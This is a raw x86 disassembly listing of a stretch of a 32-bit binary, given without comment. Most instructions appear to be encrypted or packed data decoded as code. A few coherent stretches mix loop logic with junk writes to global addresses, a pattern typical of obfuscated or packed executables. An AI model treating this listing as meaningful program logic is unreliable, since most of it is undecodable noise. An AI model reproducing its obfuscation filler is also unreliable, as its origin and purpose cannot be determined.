  408a20:	bound  ebx,QWORD PTR [eax-0x1ee9a777]
  408a26:	jge    0x408a04
  408a28:	test   eax,0x9a55362c
  408a2d:	pop    ss
  408a2e:	jb     0x4089b8
  408a30:	je     0x408aa8
  408a32:	inc    ecx
  408a33:	lea    ebp,[ebx]
  408a35:	xor    eax,DWORD PTR [ecx]
  408a37:	cld    
  408a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a39:	sub    DWORD PTR [ebx-0x41],esi
  408a3c:	stos   DWORD PTR es:[edi],eax
  408a3d:	sub    BYTE PTR [esi+eiz*2-0x26c9251d],ah
  408a44:	add    edi,edi
  408a46:	aad    0x87
  408a48:	in     al,0x10
  408a4a:	sub    DWORD PTR [edi+eiz*4+0x48],0x5c63e7ab
  408a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a53:	mov    BYTE PTR [eax],bh
  408a55:	pop    ebx
  408a56:	mov    esp,DWORD PTR [edi+eax*1]
  408a59:	pop    ebp
  408a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a5b:	fmul   QWORD PTR [esp+esi*4]
  408a5e:	jb     0x408ac4
  408a60:	sbb    ah,BYTE PTR [esi-0x4]
  408a63:	jge    0x408a96
  408a65:	inc    esp
  408a66:	mov    eax,ds:0xb6485e16
  408a6b:	lahf   
  408a6c:	rcl    DWORD PTR [edx],cl
  408a6e:	out    dx,eax
  408a6f:	loope  0x408ad1
  408a71:	dec    BYTE PTR [ebx+0x27]
  408a74:	ds ret 
  408a76:	cmc    
  408a77:	stos   BYTE PTR es:[edi],al
  408a78:	push   edx
  408a79:	dec    ecx
  408a7a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408a7c:	or     DWORD PTR [edx+0x50],esp
  408a7f:	test   BYTE PTR [edx],dh
  408a81:	pop    es
  408a82:	jmp    0x408a30
  408a84:	or     eax,0x7b27e9d8
  408a89:	in     eax,0x8e
  408a8b:	or     al,0xa4
  408a8d:	ret    
  408a8e:	stos   BYTE PTR es:[edi],al
  408a8f:	xchg   esi,eax
  408a90:	mov    edx,ss
  408a92:	sub    BYTE PTR [ebx],al
  408a94:	loope  0x408b11
  408a96:	jns    0x408af9
  408a98:	or     al,0xe
  408a9a:	je     0x408abb
  408a9c:	inc    ebx
  408a9d:	push   0x67
  408a9f:	inc    ebx
  408aa0:	or     dh,BYTE PTR [edi+0x1466530d]
  408aa6:	das    
  408aa7:	xchg   esp,eax
  408aa8:	and    ebp,esp
  408aaa:	loop   0x408a9f
  408aac:	jno    0x408aac
  408aae:	xchg   edx,eax
  408aaf:	push   ds
  408ab0:	and    eax,0x6a7e3c34
  408ab5:	cdq    
  408ab6:	pop    es
  408ab7:	in     eax,0xa2
  408ab9:	jmp    0xe56c:0x6030fd08
  408ac0:	push   esi
  408ac1:	mov    ah,0x8f
  408ac3:	xchg   esi,eax
  408ac4:	adc    al,0x67
  408ac6:	inc    esp
  408ac7:	stc    
  408ac8:	mov    edx,0x9ab076ee
  408acd:	push   eax
  408ace:	inc    ecx
  408acf:	adc    ebx,DWORD PTR [edi+0x3f]
  408ad2:	and    eax,0xcfe3e40
  408ad7:	(bad)
  408ada:	outs   dx,DWORD PTR ds:[esi]
  408adb:	dec    ebp
  408adc:	xchg   ebx,eax
  408add:	pop    ebp
  408ade:	repz inc esi
  408ae0:	test   eax,0xb332a6c2
  408ae5:	or     bh,ah
  408ae7:	aad    0x7e
  408ae9:	cmp    bl,BYTE PTR [ebx-0xca6e8e6]
  408aef:	mov    ebx,ds
  408af1:	mov    ah,0x96
  408af3:	fcomp  DWORD PTR [esp+edi*1+0x5b]
  408af7:	xor    eax,0x49f10c06
  408afc:	rcr    ebp,cl
  408afe:	lds    edx,FWORD PTR ds:0x8098cb41
  408b04:	inc    esi
  408b05:	mov    bh,0x9f
  408b07:	rcl    BYTE PTR [ebp+0xa],1
  408b0a:	or     al,0xa2
  408b0c:	(bad)  
  408b0d:	sbb    eax,0xa10c0f85
  408b12:	jno    0x408aee
  408b14:	ret    0xd1d
  408b17:	(bad)  
  408b18:	out    0xd4,eax
  408b1a:	pop    ebx
  408b1b:	ins    DWORD PTR es:[edi],dx
  408b1c:	js     0x408af2
  408b1e:	push   ebp
  408b1f:	dec    BYTE PTR [ecx+ecx*4]
  408b22:	xlat   BYTE PTR ds:[ebx]
  408b23:	push   ds
  408b24:	scas   al,BYTE PTR es:[edi]
  408b25:	int3   
  408b26:	pop    esp
  408b27:	test   edx,0x59fb36ed
  408b2d:	not    ch
  408b2f:	mov    dl,0xf4
  408b31:	int3   
  408b32:	jo     0x408b09
  408b34:	xchg   BYTE PTR [eax],bl
  408b36:	xor    cl,BYTE PTR [eax]
  408b38:	setno  dl
  408b3b:	das    
  408b3c:	dec    esp
  408b3d:	popf   
  408b3e:	ret    
  408b3f:	sub    eax,0x993a54a3
  408b44:	(bad)  
  408b45:	idiv   BYTE PTR ds:0xfb1f57df
  408b4b:	xchg   ecx,eax
  408b4c:	mov    ebx,0x847b8ee4
  408b51:	ret    
  408b52:	inc    esi
  408b53:	shr    BYTE PTR [edi-0x74a181b8],0x6b
  408b5a:	nop
  408b5b:	idiv   DWORD PTR [eax]
  408b5d:	jle    0x408b56
  408b5f:	mov    dl,0xd9
  408b61:	int    0x83
  408b63:	jne    0x408b33
  408b65:	stc    
  408b66:	fsub   QWORD PTR [eax+0x46a7e258]
  408b6c:	xor    bl,ah
  408b6e:	and    esi,ebp
  408b70:	cli    
  408b71:	fmul   st(3),st
  408b73:	cmc    
  408b74:	imul   esp,ebp,0x4f
  408b77:	test   eax,0x3577b334
  408b7c:	inc    ebp
  408b7d:	enter  0x5030,0x68
  408b81:	dec    eax
  408b82:	retf   0xaae9
  408b85:	push   esi
  408b86:	call   0x193ad202
  408b8b:	out    0x60,al
  408b8d:	mov    eax,ss
  408b8f:	aad    0x4d
  408b91:	xorpd  xmm1,XMMWORD PTR [ecx]
  408b95:	lds    ebp,FWORD PTR [ebx+0xa76ded5]
  408b9b:	data16 test BYTE PTR [edi],al
  408b9e:	retf   
  408b9f:	enter  0xd1f,0xb
  408ba3:	not    ebx
  408ba5:	push   ss
  408ba6:	xchg   esp,eax
  408ba7:	fwait
  408ba8:	ret    
  408ba9:	jg     0x408b9f
  408bab:	in     al,dx
  408bac:	pop    ebx
  408bad:	pop    ebp
  408bae:	cld    
  408baf:	dec    ebp
  408bb0:	pop    ds
  408bb1:	aaa    
  408bb2:	enter  0x7afe,0x35
  408bb6:	or     ebp,DWORD PTR [ebp-0x6c83fa4b]
  408bbc:	adc    ch,BYTE PTR [ebx+0x6]
  408bbf:	mov    ah,0x88
  408bc1:	(bad)  
  408bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bc3:	push   DWORD PTR [edx+0x1319e799]
  408bc9:	mov    esi,0xbed9d0e7
  408bce:	add    DWORD PTR [ecx+0x47],0x57
  408bd2:	cmc    
  408bd3:	jcxz   0x408b8a
  408bd6:	sub    esi,DWORD PTR [edx*4+0x2f50a791]
  408bdd:	dec    edx
  408bde:	ins    DWORD PTR es:[edi],dx
  408bdf:	mov    ds:0xacb5cd42,al
  408be4:	or     al,0x7a
  408be6:	push   edi
  408be7:	adc    al,0x8
  408be9:	sti    
  408bea:	aad    0xb7
  408bec:	xor    eax,0x7becd379
  408bf1:	icebp  
  408bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf3:	ror    ebx,1
  408bf5:	push   ebp
  408bf6:	cwde   
  408bf7:	pop    eax
  408bf8:	add    al,0xb5
  408bfa:	mov    ds:0x43617107,eax
  408bff:	sbb    BYTE PTR [eax-0x31],dh
  408c02:	mov    dl,0xf5
  408c04:	popa   
  408c05:	jecxz  0x408c25
  408c07:	rcr    DWORD PTR [edi+ecx*1],0x90
  408c0b:	jmp    0x7da0f54a
  408c10:	pop    ecx
  408c11:	push   0xffffffd4
  408c13:	popa   
  408c14:	add    al,0x88
  408c16:	sub    al,0x6c
  408c18:	jns    0x408bd2
  408c1a:	retf   0x1944
  408c1d:	popf   
  408c1e:	jns    0x408c5b
  408c20:	mov    DWORD PTR ds:0xad7b34c9,edx
  408c26:	test   ebx,edi
  408c28:	stc    
  408c29:	cmp    bl,BYTE PTR [edi]
  408c2b:	cmp    BYTE PTR [edx-0x8c2f84e],al
  408c31:	cdq    
  408c32:	add    ah,bh
  408c34:	icebp  
  408c35:	xor    eax,0xce737511
  408c3a:	mov    DWORD PTR [esi+eax*2+0x6e741d5a],esp
  408c41:	test   BYTE PTR [eax+0x6f],0xdc
  408c45:	cmc    
  408c46:	jmp    0x29eb:0xa94a3fd8
  408c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c4e:	in     al,0xd4
  408c50:	mov    cl,BYTE PTR [edi]
  408c52:	test   DWORD PTR [ecx+0x0],eax
  408c55:	add    BYTE PTR [eax],al
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x4345c3,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434587,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x4345b7,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x4344ef,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x4345ff,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x434577,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	out    0x88,al
  408ccb:	in     eax,0xa2
  408ccd:	inc    esp
  408cce:	in     eax,0x7e
  408cd0:	jle    0x408cb3
  408cd2:	js     0x408d52
  408cd4:	jle    0x408d1b
  408cd6:	cmp    DWORD PTR [ecx+0xf07e4d7],edx
  408cdc:	lea    eax,[edx]
  408cde:	test   eax,0xd75c724
  408ce3:	iret   
  408ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ce5:	out    dx,al
  408ce6:	xchg   esi,eax
  408ce7:	es call 0x35f2:0xc66bc2b7
  408cef:	inc    ebx
  408cf0:	fwait
  408cf1:	xor    ch,bl
  408cf3:	fs sahf 
  408cf5:	aaa    
  408cf6:	aas    
  408cf7:	dec    ebx
  408cf8:	ins    DWORD PTR es:[edi],dx
  408cf9:	sbb    BYTE PTR [edx],bh
  408cfb:	test   al,0x6b
  408cfd:	adc    eax,0x5de21f6a
  408d02:	fwait
  408d03:	aas    
  408d04:	push   ebx
  408d05:	xlat   BYTE PTR ds:[ebx]
  408d06:	adc    DWORD PTR [edi-0x199ee257],ebp
  408d0c:	cmp    eax,0xb71f3e1e
  408d11:	jae    0x408d86
  408d13:	cmp    eax,0x372d0c3b
  408d18:	es push 0x4a
  408d1b:	mov    WORD PTR [edi],ds
  408d1d:	or     BYTE PTR ds:0xf6610329,cl
  408d23:	push   ebp
  408d24:	int3   
  408d25:	aad    0x32
  408d27:	addr16 xchg esi,eax
  408d29:	dec    edx
  408d2a:	addr16 jne 0x408d2f
  408d2d:	add    al,0x2f
  408d2f:	add    ebp,DWORD PTR [eax+0x3e]
  408d32:	stos   DWORD PTR es:[edi],eax
  408d33:	sbb    eax,0x64797202
  408d38:	jmp    0x408d2d
  408d3a:	xchg   ebp,eax
  408d3b:	cmp    DWORD PTR [eax-0x33],edx
  408d3e:	loopne 0x408d2f
  408d40:	ins    BYTE PTR es:[edi],dx
  408d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d42:	andnps xmm4,XMMWORD PTR [ecx+0x50ed98e6]
  408d49:	fmul   QWORD PTR ds:0x2bf631db
  408d4f:	rcr    BYTE PTR [ebx-0x40ca5f91],cl
  408d55:	leave  
  408d56:	bound  edi,QWORD PTR [esi-0x1d]
  408d59:	pushf  
  408d5a:	add    al,0x9c
  408d5c:	push   es
  408d5d:	or     eax,0xdbb2766d
  408d62:	adc    cl,BYTE PTR [edi-0x64b09d2d]
  408d68:	mov    DWORD PTR [ebx+0x2b283f92],0x1ce78e50
  408d72:	js     0x408dc2
  408d74:	mov    esi,0x9f406481
  408d79:	jmp    0x408de1
  408d7b:	jge    0x408d11
  408d7d:	adc    dh,BYTE PTR [eax]
  408d7f:	inc    ecx
  408d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d81:	push   ds
  408d82:	cmp    BYTE PTR [ebx],dh
  408d84:	(bad)  
  408d85:	leave  
  408d86:	push   es
  408d87:	ror    DWORD PTR [esi+ebx*8-0x64],cl
  408d8b:	frstor es:[edx+0x5c4d6a2e]
  408d92:	push   ss
  408d93:	mov    WORD PTR [esi],es
  408d95:	out    0xfd,al
  408d97:	push   eax
  408d98:	sti    
  408d99:	push   ds
  408d9a:	inc    esp
  408d9b:	inc    edx
  408d9c:	mov    cs,WORD PTR [ecx+0x2f494cb4]
  408da2:	data16 in al,0x15
  408da5:	cmp    ebx,DWORD PTR [eax-0x63]
  408da8:	add    bh,bh
  408daa:	adc    BYTE PTR [ebp-0x6b8ab59],bh
  408db0:	loopne 0x408d62
  408db2:	dec    edi
  408db3:	ds dec esp
  408db5:	das    
  408db6:	mov    DWORD PTR [eax-0x7a],edi
  408db9:	pop    ecx
  408dba:	cld    
  408dbb:	inc    ebx
  408dbc:	dec    esp
  408dbd:	pop    edi
  408dbe:	fst    QWORD PTR [esi]
  408dc0:	push   esp
  408dc1:	invd   
  408dc3:	addr16 jl 0x408e1b
  408dc6:	jp     0x408daa
  408dc8:	stc    
  408dc9:	push   edx
  408dca:	push   ecx
  408dcb:	lahf   
  408dcc:	sub    dl,cl
  408dce:	sbb    dh,cl
  408dd0:	mov    esi,0xf86c71f3
  408dd5:	addr16 (bad) 
  408dd7:	xchg   esp,eax
  408dd8:	loop   0x408dd8
  408dda:	dec    ebp
  408ddb:	imul   esi,DWORD PTR [edi],0x1
  408dde:	pop    ds
  408ddf:	xlat   BYTE PTR ds:[ebx]
  408de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de1:	mov    ch,0x49
  408de3:	in     al,0xdc
  408de5:	dec    ebx
  408de6:	pop    esi
  408de7:	test   DWORD PTR [esi-0x47dadcb2],ecx
  408ded:	js     0x408d7d
  408def:	divps  xmm7,xmm3
  408df2:	fidivr DWORD PTR [edx]
  408df4:	inc    ebp
  408df5:	ds ja  0x408dc7
  408df8:	pushf  
  408df9:	imul   esi,DWORD PTR [ebp-0x48]
  408dfd:	push   edi
  408dfe:	and    al,bl
  408e00:	gs pop ecx
  408e02:	inc    edx
  408e03:	sub    DWORD PTR [esi],edi
  408e05:	xchg   DWORD PTR [eax-0x389c2695],esi
  408e0b:	icebp  
  408e0c:	les    edi,FWORD PTR ds:0x2a923c6d
  408e12:	mov    dl,0x1a
  408e14:	ins    DWORD PTR es:[edi],dx
  408e15:	nop
  408e16:	(bad)  
  408e17:	and    al,0x12
  408e19:	arpl   bp,cx
  408e1b:	cmp    ah,ah
  408e1d:	xchg   BYTE PTR [ebp-0x1e452bb3],bh
  408e23:	pop    edx
  408e24:	ins    BYTE PTR es:[edi],dx
  408e25:	(bad)  
  408e26:	add    eax,0x36731a49
  408e2b:	or     eax,0x44ad2bce
  408e30:	xlat   BYTE PTR ds:[ebx]
  408e31:	mov    es,WORD PTR [edx-0x57]
  408e34:	adc    DWORD PTR [edi-0x6ed8c4a7],0xfffffffe
  408e3b:	xchg   esi,eax
  408e3c:	into   
  408e3d:	mov    bl,0x1c
  408e3f:	push   eax
  408e40:	out    dx,al
  408e41:	fwait
  408e42:	das    
  408e43:	mov    ebx,0xe466fe3c
  408e48:	int    0x4c
  408e4a:	mov    ebx,esp
  408e4c:	(bad)  
  408e4d:	out    dx,eax
  408e4e:	sar    BYTE PTR [edx],cl
  408e50:	add    BYTE PTR [edi+ecx*1+0xfcbba81],dl
  408e57:	in     eax,0xf
  408e59:	add    bh,BYTE PTR [ebx-0x35]
  408e5c:	inc    ebx
  408e5e:	inc    eax
  408e5f:	sub    eax,0xf6a1999f
  408e64:	nop
  408e65:	das    
  408e66:	mov    dh,0x76
  408e68:	jno    0x408e27
  408e6a:	pop    edi
  408e6b:	push   eax
  408e6c:	push   ebx
  408e6d:	sti    
  408e6e:	bound  edi,QWORD PTR [esi]
  408e70:	mov    ecx,0xbed2bfa4
  408e75:	les    esp,FWORD PTR [eax+0x4930edf6]
  408e7b:	xor    BYTE PTR [ebx-0x5a380563],dl
  408e81:	mov    ah,0x5e
  408e83:	retf   
  408e84:	mov    ds:0xac1257c0,al
  408e89:	lods   al,BYTE PTR ds:[esi]
  408e8a:	outs   dx,DWORD PTR ds:[esi]
  408e8b:	daa    
  408e8c:	mov    BYTE PTR [edi],al
  408e8e:	fisub  WORD PTR [esi]
  408e90:	fisttp DWORD PTR [ebp+eiz*8-0x62a9e8cf]
  408e97:	pop    ss
  408e98:	mov    ds:0x74888ea4,al
  408e9d:	retf   0x5cf
  408ea0:	and    DWORD PTR [eax+esi*8-0x59722f09],0xf1562dd5
  408eab:	rcr    BYTE PTR [ecx+0x227346aa],cl
  408eb1:	mov    ch,0x1f
  408eb3:	or     ch,BYTE PTR [eax-0x51]
  408eb6:	lds    ebx,FWORD PTR [ecx-0x61]
  408eb9:	into   
  408eba:	loope  0x408ede
  408ebc:	sbb    BYTE PTR [ecx+ecx*2],bl
  408ebf:	pslld  mm5,QWORD PTR [ebx+0x35]
  408ec3:	fldcw  WORD PTR [ebx]
  408ec5:	jno    0x408e62
  408ec7:	into   
  408ec8:	inc    ebx
  408ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eca:	stos   BYTE PTR es:[edi],al
  408ecb:	pushfw 
  408ecd:	mov    ah,0xc9
  408ecf:	xor    eax,0x2726a79e
  408ed4:	clc    
  408ed5:	ss das 
  408ed7:	inc    ebx
  408ed8:	and    al,BYTE PTR [edi+0x35064f3a]
  408ede:	mov    bh,0xfb
  408ee0:	sti    
  408ee1:	gs dec edx
  408ee3:	pop    esi
  408ee4:	enter  0x6ba4,0x2f
  408ee8:	sbb    bh,dl
  408eea:	test   ebx,esp
  408eec:	js     0x408e92
  408eee:	sub    eax,DWORD PTR [ecx-0x55]
  408ef1:	hlt    
  408ef2:	enter  0xc7df,0x6a
  408ef6:	xchg   esi,eax
  408ef7:	inc    eax
  408ef8:	lahf   
  408ef9:	and    bl,bh
  408efb:	push   esi
  408efc:	push   cs
  408efd:	pop    esp
  408eff:	test   BYTE PTR [esi+0xd],0x59
  408f03:	in     eax,dx
  408f04:	iret   
  408f05:	adc    eax,0x2431d5e9
  408f0a:	pop    ebx
  408f0b:	inc    eax
  408f0c:	jg     0x408ecf
  408f0e:	nop
  408f0f:	fimul  WORD PTR [ecx-0x7a]
  408f12:	gs mov cl,0x54
  408f15:	xor    eax,0x25e7f03c
  408f1a:	inc    cl
  408f1c:	xor    eax,0x339868f6
  408f21:	add    al,0xbd
  408f23:	lock push ds
  408f25:	icebp  
  408f26:	add    al,0xa1
  408f28:	pop    eax
  408f29:	test   DWORD PTR [esp+esi*2+0x55],0x4bc26273
  408f31:	bound  ebx,QWORD PTR [ebx]
  408f33:	ja     0x408f63
  408f35:	dec    ebx
  408f36:	fstp   DWORD PTR [esp+ecx*8]
  408f39:	inc    esi
  408f3a:	mov    bl,0x3b
  408f3c:	dec    eax
  408f3d:	lods   eax,DWORD PTR ds:[esi]
  408f3e:	pop    ss
  408f3f:	out    0x83,al
  408f41:	or     BYTE PTR gs:[eax],al
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x4345c3,0x434583
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434603
  408f5a:	or     DWORD PTR ds:0x4345c3,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x4344df,0x43454f
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x4345c7,0x434547
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x4344eb
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x4345b7,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x4344ff,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1-0x67f47aa7]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x408fc2
  408fec:	ins    BYTE PTR es:[edi],dx
  408fed:	jmp    0xb476:0xb08c3eeb
  408ff4:	and    al,0x20
  408ff6:	jl     0x40902f
  408ff8:	hlt    
  408ff9:	mov    es,WORD PTR [edi]
  408ffb:	or     al,bh
  408ffd:	rol    DWORD PTR [ebx-0x78],1
  409000:	in     al,0x85
  409002:	data16 aad 0x6d
  409005:	mov    ch,BYTE PTR [ebp-0x14]
  409008:	out    dx,al
  409009:	fdivr  QWORD PTR [edx+ebx*4-0x1cf8fd06]
  409010:	mov    dh,0x2d
  409012:	push   0x5f93e42f
  409017:	xor    DWORD PTR [esi],ebp
  409019:	mov    eax,0x270e670f
  40901e:	pop    es
  40901f:	adc    BYTE PTR [edi],dh
  409021:	push   cs
  409022:	mov    al,0x43
  409024:	xor    eax,0xa9c2bb46
  409029:	out    dx,eax
  40902a:	test   BYTE PTR [esi-0x249848d3],cl
  409030:	outs   dx,BYTE PTR ds:[esi]
  409031:	das    
  409032:	pop    es
  409033:	call   0xf516:0xf269275b
  40903a:	and    ecx,esp
  40903c:	(bad)  
  40903d:	imul   eax,DWORD PTR [ebx+0x55c1c3d0],0xffffff9a
  409044:	add    BYTE PTR [edi-0x693033f],bh
  40904a:	outs   dx,DWORD PTR ds:[esi]
  40904b:	(bad)  
  40904d:	add    ch,cl
  40904f:	or     bl,BYTE PTR [ecx-0x4ea7f08d]
  409055:	lods   al,BYTE PTR ds:[esi]
  409056:	imul   ebp,edi,0xe7785507
  40905c:	jno    0x409097
  40905e:	jnp    0x40903b
  409060:	jle    0x40907d
  409062:	mov    dl,0xe6
  409064:	mov    ch,0xa6
  409066:	jle    0x40903e
  409068:	rcr    BYTE PTR [esp+edi*8+0x70],1
  40906c:	aad    0x64
  40906e:	out    0xf6,eax
  409070:	lahf   
  409071:	js     0x4090ed
  409073:	repnz retf 
  409075:	push   edx
  409076:	mov    cl,BYTE PTR [ebp-0x38af7525]
  40907c:	sti    
  40907d:	(bad)  
  40907e:	out    0xdd,eax
  409080:	cmp    BYTE PTR [edx+0x68],dh
  409083:	adc    DWORD PTR [edx-0x49],ebp
  409086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409087:	popf   
  409088:	xchg   edi,eax
  409089:	pop    ebx
  40908a:	shl    dh,1
  40908c:	jl     0x40908c
  40908e:	xchg   edi,eax
  40908f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409090:	repnz stos BYTE PTR es:[edi],al
  409092:	jle    0x4090f0
  409094:	stc    
  409095:	stos   DWORD PTR es:[edi],eax
  409096:	lods   eax,DWORD PTR ds:[esi]
  409097:	mov    ebx,0xf0cd11c6
  40909c:	pop    ebx
  40909d:	jnp    0x409081
  40909f:	sbb    DWORD PTR [ebp-0x205eb494],edi
  4090a5:	outs   dx,DWORD PTR ds:[esi]
  4090a6:	mov    cl,0x41
  4090a8:	mov    cs,WORD PTR [ebx]
  4090aa:	push   edx
  4090ab:	jg     0x409069
  4090ad:	fld    QWORD PTR [eax+0x6f33400f]
  4090b3:	aam    0x18
  4090b5:	xor    DWORD PTR [ecx+0x2f],ebp
  4090b8:	scas   eax,DWORD PTR es:[edi]
  4090b9:	mov    eax,0xfa8a47ed
  4090be:	mov    ah,0x89
  4090c0:	(bad)  [ebp-0x1]
  4090c3:	cs icebp 
  4090c5:	and    al,0x96
  4090c7:	jle    0x40910a
  4090c9:	(bad)  
  4090cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090cc:	cmp    eax,0x5faa40a5
  4090d1:	mov    ebx,0x26aeecec
  4090d6:	inc    eax
  4090d7:	jl     0x409131
  4090d9:	xor    al,0x19
  4090db:	jecxz  0x409107
  4090dd:	out    dx,al
  4090de:	adc    eax,0x5664b3a4
  4090e3:	sub    al,0xf2
  4090e5:	inc    edi
  4090e6:	add    BYTE PTR [ebp-0x30],0x98
  4090ea:	xor    BYTE PTR [ebx],bl
  4090ec:	les    esi,FWORD PTR [edx-0xc]
  4090ef:	cmp    bl,al
  4090f1:	rol    DWORD PTR [esi+0x2c],cl
  4090f4:	pop    eax
  4090f5:	(bad)  
  4090f6:	xor    eax,0x9e9de813
  4090fb:	stos   DWORD PTR es:[edi],eax
  4090fc:	inc    ecx
  4090fd:	xor    bh,0xea
  409100:	mov    BYTE PTR [edi],bh
  409102:	inc    ebp
  409103:	in     eax,0x6e
  409105:	mov    esi,0x3962060a
  40910a:	shr    edx,cl
  40910c:	cmp    dh,BYTE PTR [edx-0x1b9de98d]
  409112:	push   ebp
  409113:	loop   0x409150
  409115:	inc    edi
  409116:	shl    ecx,cl
  409118:	cmp    BYTE PTR [ecx-0x209e6c65],dh
  40911e:	mov    cs,WORD PTR [ecx]
  409120:	and    bh,dh
  409122:	cmp    eax,0x873f48f3
  409127:	jmp    0x53c5:0xf2881918
  40912e:	js     0x4091ad
  409130:	add    BYTE PTR [edi],ch
  409132:	mov    ch,0x2f
  409134:	in     al,0x35
  409136:	jmp    0x30f73a99
  40913b:	and    esp,edx
  40913d:	enter  0x2d76,0x5a
  409141:	adc    al,0x86
  409143:	dec    ecx
  409144:	ffreep st(0)
  409146:	shl    DWORD PTR [esi],cl
  409148:	mov    eax,0x62ee10e
  40914d:	aas    
  40914e:	fadd   st,st(3)
  409150:	ins    BYTE PTR es:[edi],dx
  409151:	fdiv   QWORD PTR [edx+edx*8-0x242651ae]
  409158:	shr    ah,0xbb
  40915b:	or     eax,0x89215f03
  409160:	aaa    
  409161:	sbb    BYTE PTR [esi-0x46bdf6f8],al
  409167:	jne    0x40912c
  409169:	mov    edi,0xaa1bdc3f
  40916e:	inc    bp
  409170:	push   ds
  409171:	ja     0x40916a
  409173:	push   esp
  409174:	fs pop esi
  409176:	ins    DWORD PTR es:[edi],dx
  409177:	(bad)  
  409178:	jg     0x4091d0
  40917a:	ret    0xafda
  40917d:	cld    
  40917e:	push   0xe8d743a5
  409183:	dec    edi
  409184:	push   edi
  409185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409186:	sub    edi,ebp
  409188:	push   esp
  409189:	dec    esi
  40918a:	int    0xdd
  40918c:	mov    eax,0x77aa5124
  409191:	pop    ecx
  409192:	lock push edx
  409194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409195:	mov    BYTE PTR [edi+ebx*4],dl
  409198:	add    cl,bl
  40919a:	(bad)  ss:[edx-0x71c54660]
  4091a1:	pop    ecx
  4091a2:	into   
  4091a3:	cwde   
  4091a4:	jbe    0x409208
  4091a6:	fdiv   DWORD PTR [edx+0x4a]
  4091a9:	bound  edx,QWORD PTR [esi-0x552401e]
  4091af:	and    eax,0xf4b62006
  4091b4:	cdq    
  4091b5:	jno    0x4091f7
  4091b7:	push   edi
  4091b8:	add    DWORD PTR [ebx+eax*1-0x38],edx
  4091bc:	add    DWORD PTR [esi-0x27f65f42],0x46
  4091c3:	les    esi,FWORD PTR [ecx-0x66]
  4091c6:	fmul   st,st(0)
  4091c8:	jge    0x409249
  4091ca:	imul   ebx,ebp,0xf1e08937
  4091d0:	xchg   ecx,eax
  4091d1:	xor    eax,0x68c8cfef
  4091d6:	mov    dl,bh
  4091d8:	ins    BYTE PTR es:[edi],dx
  4091d9:	inc    edx
  4091da:	adc    bh,BYTE PTR [eax+0x157ec7e7]
  4091e0:	jmp    0x6f1c:0xdc96e6db
  4091e7:	xchg   esi,eax
  4091e8:	mov    edi,0x167c63c7
  4091ed:	jo     0x409186
  4091ef:	add    DWORD PTR [ebx+0x11],ecx
  4091f2:	inc    ebx
  4091f3:	mov    edi,0x8e6f867f
  4091f8:	je     0x4091ab
  4091fa:	popf   
  4091fb:	cwde   
  4091fc:	add    bh,BYTE PTR [ecx+ecx*4+0x801dbdd]
  409203:	mov    ecx,0x7aac4335
  409208:	adc    bl,BYTE PTR [ecx]
  40920a:	xor    al,0x8e
  40920c:	push   esi
  40920d:	inc    ebp
  40920e:	es out 0xb6,eax
  409211:	mov    bl,BYTE PTR [ecx]
  409213:	loope  0x409286
  409215:	retf   
